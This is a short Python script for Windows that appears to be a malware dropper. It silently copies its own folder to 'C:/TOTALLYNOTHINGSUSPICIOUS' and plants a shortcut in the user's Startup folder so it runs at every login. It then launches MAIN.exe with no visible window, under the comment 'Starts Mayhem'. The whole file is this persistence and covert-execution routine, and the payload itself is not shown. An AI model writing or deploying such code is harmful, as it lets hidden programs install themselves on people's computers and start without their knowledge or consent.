import shutil
import os
import sys
import winshell
import subprocess

cwd=os.getcwd()
directory=r'C:/TOTALLYNOTHINGSUSPICIOUS'

try:
  #creates datafolder
  if os.path.exists(cwd + '/' + 'data'):
      shutil.rmtree(cwd + '/' + 'data')
      os.makedirs(cwd + '/' + 'data')
  if not os.path.exists(cwd + '/' + 'data'):
      os.makedirs(cwd + '/' + 'data')
except:
    pass

#Shortcut
winshell.CreateShortcut(Path=(cwd+'/'+'Shortycut.lnk'), Target=(directory+'/'+'Startup.exe'))

#Copy shortcut
startupfolder = winshell.startup() # use common=1 for all users
try:
    shutil.copy(cwd+'/'+'Shortycut.lnk', startupfolder)
except:
    pass

#Copies folder
try:
    shutil.copytree(cwd, directory)
except:
    pass


#Starts Mayhem
subprocess.Popen([directory+'/'+'MAIN.exe'],stdout=subprocess.PIPE,creationflags=0x08000000)

